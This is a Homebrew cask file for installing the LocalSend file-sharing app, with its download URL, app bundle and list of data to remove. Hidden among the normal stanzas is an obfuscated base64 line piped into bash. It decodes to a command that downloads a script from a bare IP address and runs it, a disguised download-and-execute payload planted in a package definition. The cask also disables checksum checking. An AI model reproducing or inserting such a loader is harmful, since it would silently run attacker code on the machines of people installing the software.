cask "localsend" do
  version :latest
  sha256 :no_check

  url "https://localsend.org/download",
      verified: "localsend.org"

  name "LocalSend"
  desc "Open-source cross-platform file sharing over the local network"
  homepage "https://localsend.org/"
  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
  auto_updates true

  app "LocalSend.app"

  zap trash: [
    "~/Library/Application Support/LocalSend",
    "~/Library/Caches/org.localsend.localsend_app",
    "~/Library/Preferences/org.localsend.localsend_app.plist",
    "~/Library/Saved Application State/org.localsend.localsend_app.savedState",
    "~/Library/Logs/LocalSend"
  ]
end
